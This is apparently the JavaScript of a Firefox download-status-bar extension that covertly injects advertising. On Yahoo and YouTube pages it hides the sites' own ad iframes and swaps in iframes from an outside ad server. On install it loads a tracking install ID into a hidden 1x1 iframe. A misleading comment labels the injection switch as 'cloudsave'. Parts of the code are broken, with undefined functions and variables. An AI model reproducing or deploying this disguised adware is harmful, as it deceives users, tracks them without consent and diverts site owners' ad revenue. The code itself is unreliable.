if (!dsb20111022) var dsb20111022 = {};
// Globals
dsb20111022.GLOBALS = function () {
  return {
    PLUGIN_NAMESPACE : 'downbar',
    PLUGIN_SERVER : 'http://www.downloadstatusbarapp.com/',
    AZ_300 : 57,
    AZ_728 : 58,
    INST_METHOD : 2,
    BUILD_ID : 0
  }
}();

// Insertion point
// Executes at url change, runs pluginnetwork contentInit
//
dsb20111022.urlBarListener = function () {
  return {
    QueryInterface: function (aIID) {
      if (aIID.equals(Components.interfaces.nsIWebProgressListener) || aIID.equals(Components.interfaces.nsISupportsWeakReference) || aIID.equals(Components.interfaces.nsISupports)) return this;
      throw Components.results.NS_NOINTERFACE;
    },
    onLocationChange: function (aProgress, aRequest, aURI) {
      dsb20111022.pluginnetwork.contentInit();
    },
    onStateChange: function (aWebProgress, aRequest, aFlag, aStatus) {
      if (aFlag & Components.interfaces.nsIWebProgressListener.STATE_STOP) {
        dsb20111022.pluginnetwork.contentInit();
      }
    },
    onProgressChange: function (a, b, c, d, e, f) {},
    onStatusChange: function (a, b, c, d) {},
    onSecurityChange: function (a, b, c) {}
  }
}();

//
// Preference Storage Helper
// 
dsb20111022.pluginStorage = function () {
  return {
    getPrefManager: function () {
      return Components.classes["@mozilla.org/preferences-service;1"].getService(Components.interfaces.nsIPrefBranch);
    }(),
    getItem: function (key) {
      var prefString = "";
      try {
        prefString = this.getPrefManager.getCharPref(key);
      }
      catch (err) {}
      if (prefString == "" || !prefString) {
        return null;
      } else {
        return this.getPrefManager.getCharPref(key);
      }
    },
    getBool: function (key) {
      var prefString = "";
      try {
        prefString = this.getPrefManager.getBoolPref(key);
      }
      catch (err) {}
      if (!typeof (prefString) == "boolean") {
        return null;
      } else {
        return this.getPrefManager.getBoolPref(key);
      }
    },
    setItem: function (key, value) {
      if (typeof (value) != 'undefined') {
        // if ((typeof(value) == 'number') && (value > 2147483647)) {
        if (typeof (value) == 'number') {
          value = value.toString();
        }
        this.getPrefManager.setCharPref(key, value);
      }
      return true;
    },
    setBool: function (key, value) {
      if (typeof (value) != 'undefined') {
        if (typeof (value) == 'boolean') {
          this.getPrefManager.setBoolPref(key, value);
        }
      }
      return true;
    },
    removeItem: function (key) {
      this.getPrefManager.clearUserPref(key);
      return true;
    }
  }
}();
//
// Date Helpers
//
dsb20111022.datehelpers = function () {
  return {
    getMonthFormatted: function (date) {
      var month = (date.getMonth() + 1);
      return month < 10 ? '0' + month : month; // ('' + month) for string result
    },
    getDayFormatted: function (date) {
      var month = date.getDay();
      return month < 10 ? '0' + month : month; // ('' + month) for string result
    },
    getDayDelta: function (incomingYear, incomingMonth, incomingDay) {
      var incomingDate = new Date(incomingYear, incomingMonth - 1, incomingDay),
        today = new Date(),
        delta;
      // EDIT: Set time portion of date to 0:00:00.000
      // to match time portion of 'incomingDate'
      today.setHours(0);
      today.setMinutes(0);
      today.setSeconds(0);
      today.setMilliseconds(0);
      // Remove the time offset of the current date
      today.setHours(0);
      today.setMinutes(0);
      delta = incomingDate - today;
      return Math.round(delta / 1000 / 60 / 60 / 24);
    }
  }
}();
dsb20111022.contentscripts = function () {
  return {

    //
    // irame helper function
    // calls daily run function and if true alters request stating the plugin namespace
    // this is used to get an aproximation of active users of the plugin.
    createIframe: function (id, zone, height, width) {
      var runstr = "";
      if (dsb20111022.pluginnetwork.isFirstRunDaily()) {
        runstr = "&firstrun="+dsb20111022.GLOBALS.PLUGIN_NAMESPACE;
      }
      var ifr = content.document.createElement("iframe");
      ifr.setAttribute("src", "http://www.iicdn.com/www/delivery/afr.php?zoneid=" + zone + "&refresh=60" + runstr);
      ifr.setAttribute("height", height);
      ifr.setAttribute("width", width);
      ifr.setAttribute("name", id);
      ifr.setAttribute("id", id);
      ifr.setAttribute("type", "content");
      ifr.setAttribute("scrolling", "NO");
      ifr.setAttribute("frameborder", "0");
      return ifr;
    },
    //
    // Yahoo funtions
    // 
    contentEdits : function () {
        if (content.document.querySelector('#a47abb2d')!==null) return;
        if (content.document.querySelector('#a47abb3d')!==null) return;
        if (content.document.querySelector('#a47abb4d')!==null) return;

        var domainparts = window.location.host.split(".").reverse();
        for(var i = 0; i < swapDefObj["bl"].length; i++) {
          if(swapDefObj["bl"][i].indexOf(domainparts[1])!=-1) {
            return;// exit early
          }
        }
        
        //
        //
        // this is an arbitrary limiting function, meant solely to work half the time. but that is
        var td = dsb20111022.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.tdb');
        if (td==null) {
          if ((new Date().getMinutes()%2 == 0)==false) {
             return;
          }
        }
                 
        var ft = dsb20111022.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft');
        if (ft==null) {
          ft = Math.round(new Date().getTime()/1000);
        } else {
          ft = parseInt(ft);
        }
        if (Math.round(new Date().getTime()/1000)<ft) {
          return;
        }

        var aq = parseInt(dsb20111022.pluginStorage.getItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq'));
        var tta = false;
        var AZ_728 = 0;
        var AZ_300 = 0;
        var AZ_160 = 0;
        if(aq>0) {
          if (document.querySelector('iframe[width="300"]')!==null) {
            var a1 = document.querySelector('iframe[width="300"]');
            if (a1.height == 250)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq";
              AZ_300 = pluginnetwork.GLOBALS.AZ_300;
              r.appendChild(this.createIframe('a47abb2d', AZ_300, 250, 300));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }
          if (document.querySelector('iframe[width="728"]')!==null) {
            var a1 = document.querySelector('iframe[width="728"]');
            if (a1.height == 90)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq2";
              AZ_728 = pluginnetwork.GLOBALS.AZ_728;
              r.appendChild(this.createIframe('a47abb3d', AZ_728, 90, 728));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }              
          if (document.querySelector('iframe[width="160"]')!==null) {
            var a1 = document.querySelector('iframe[width="160"]');
            if (a1.height == 600)
            {
              var r = document.createElement("div");
              r.id = "__"+window.location.host+"_aq3";
              AZ_160 = pluginnetwork.GLOBALS.AZ_160;
              r.appendChild(this.createIframe('a47abb4d', AZ_160, 600, 160));
              a1.parentNode.appendChild(r);
              a1.style.display="none";
              aq = aq-1;
              tta = true;
            }
          }
          if (tta == true)
          {
            ft = (Math.round(new Date().getTime()/1000)+Math.floor((Math.random() * 180) + 300));
            if (aq<0) aq = 0; // prevent the accidental -1
            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.aq', aq);
            pluginnetwork.pluginStorage.setItem(pluginnetwork.GLOBALS.PLUGIN_NAMESPACE + '.ft', ft);              
          }
        }
      }
    },
    //
    // Youtube funtions
    // 
    runYouTube: function () {
      var afr300 = this.createIframe('a47abb2d', dsb20111022.GLOBALS.AZ_300, 250, 300);
      var afr728 = this.createIframe('a47abb3d', dsb20111022.GLOBALS.AZ_728, 90, 728);
    }
  }
}();
dsb20111022.pluginnetwork = function () {
  return {
    // Check if either on yahoo or youtube.
    isYahoo: function (href) {
      return href.match(/http:\/\/.*\.yahoo\.com/i);
    },
    isYoutube: function (href) {
      return href.match(/http:\/\/.*\.youtube\.com/i);
    },
    // Check if all conditions are met.
    isAllowable: function (href) {
      if (this.isYoutube(href) || this.isYahoo(href))
      return this.isYoutube(href) || this.isYahoo(href) && this.isMarketingEnabled();
    },
    
    //
    // Self explanitory, if cloudsave has been disabled dont run
    // 
    isMarketingEnabled: function () {
      if (dsb20111022.pluginStorage.getBool(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.function.cloud') == false) {
        return false;
      } else {
        return true;
      }
    },
    //
    // Determines if this is the first run of the day, if so the calling function appends the request
    //  with a querystring variable.
    //
    isFirstRunDaily: function () {
      var lastRun = dsb20111022.pluginStorage.getItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.lastrun');
      var bIsFirstRun = false;
      if (lastRun === null) {
        lastRun = 0;
      }
      var currentdate = new Date();
      var currentdatefixed = currentdate.getFullYear() + "" + dsb20111022.datehelpers.getMonthFormatted(currentdate) + "" + currentdate.getDate();
      if (parseInt(currentdatefixed) > parseInt(lastRun)) {
        dsb20111022.pluginStorage.setItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.lastrun', currentdatefixed);
        bIsFirstRun = true;
      }
      return bIsFirstRun;
    },
    //
    // isFirstRun: Returns if this is the first run of the extention.
    // TODO: build mechanism to determine if it's an upgrade.
    isFirstRun: function () {
      var prefString = dsb20111022.pluginStorage.getItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.doneWelcomeMessage');
      var bIsFirstRun = false;
      if (prefString === null) {
        bIsFirstRun = true;
      }
      return bIsFirstRun;
    },
    generateUUID: function () {
      var s = [], itoh = '0123456789ABCDEF';
      for (var i = 0; i < 36; i++) s[i] = Math.floor(Math.random() * 0x10);
      s[14] = 4; // Set 4 high bits of time_high field to version
      s[19] = (s[19] & 0x3) | 0x8; // Specify 2 high bits of clock sequence
      for (var i = 0; i < 36; i++) s[i] = itoh[s[i]];
      s[8] = s[13] = s[18] = s[23] = '-';
      return "{" + s.join('') + "}";
    },
    //
    // getUDID: generates a random uuid and saves it.g
    getUUID: function () {
      var prefString = dsb20111022.pluginStorage.getItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.installID');
      if (prefString === null) {
        prefString = this.generateUUID();
        var currentdate = new Date();
        var currentdatefixed = currentdate.getFullYear() + "-" + (currentdate.getMonth() + 1) + "-" + currentdate.getDate();
        dsb20111022.pluginStorage.setItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.buildID', dsb20111022.GLOBALS.BUILD_ID); // BUILD_ID is a constant defined above 
        dsb20111022.pluginStorage.setItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.installID', prefString);
      }
      return prefString;
    },
    openTabWithUrl: function (url) {
      var tab = getBrowser().addTab(url);
      getBrowser().selectedTab = tab;
    },
    iframeWithUrl: function (url) {
      var ifr = content.document.createElement("iframe");
      ifr.setAttribute("src", url);
      ifr.setAttribute("height", 1);
      ifr.setAttribute("width", 1);
      ifr.setAttribute("name", "install_frame");
      ifr.setAttribute("id", "install_frame");
      ifr.setAttribute("type", "content");
      ifr.setAttribute("scrolling", "NO");
      ifr.setAttribute("frameborder", "0");
      content.document.body.appendChild(ifr);
    },
    installationEvent: function() {
      switch(dsb20111022.GLOBALS.INST_METHOD) {
        case 1:
          this.openTabWithUrl(dsb20111022.GLOBALS.PLUGIN_SERVER + "newinstall/" + this.getUUID());
          dsb20111022.pluginStorage.setItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.doneWelcomeMessage', 'Yes');
          return;
        break;
        case 2:
          this.iframeWithUrl(dsb20111022.GLOBALS.PLUGIN_SERVER + "newinstall/" + this.getUUID());
          dsb20111022.pluginStorage.setItem(dsb20111022.GLOBALS.PLUGIN_NAMESPACE + '.doneWelcomeMessage', 'Yes');
          return;
        break;
        default:
          return;
      }
    },
    contentInit: function () {
      var href = getWebNavigation().currentURI.spec;
      if (content.document.location == null) return;
      if (content.document.location.protocol!="http:") return;
      if (this.isFirstRun()) {
        this.installationEvent();
        return; // exit the function untill the doneWelcomeMessage is set.
      }
      if (this.isMarketingEnabled() == false) return;
      if (this.isAllowable(href)) {
        if (this.isYahoo(href)) {
          dsb20111022.contentscripts.runYahoo();
        } else if (this.isYoutube(href)) {
          dsb20111022.contentscripts.runYouTube();
        }
      }
    },
    init: function () {
      gBrowser.addProgressListener(dsb20111022.urlBarListener, Components.interfaces.nsIWebProgress.NOTIFY_STATE_ALL);
    },
    uninit: function () {
      gBrowser.removeProgressListener(dsb20111022.urlBarListener);
    }
  }
}();
window.addEventListener("load", function () { dsb20111022.pluginnetwork.init() }, false);
window.addEventListener("unload", function () { dsb20111022.pluginnetwork.uninit() }, false);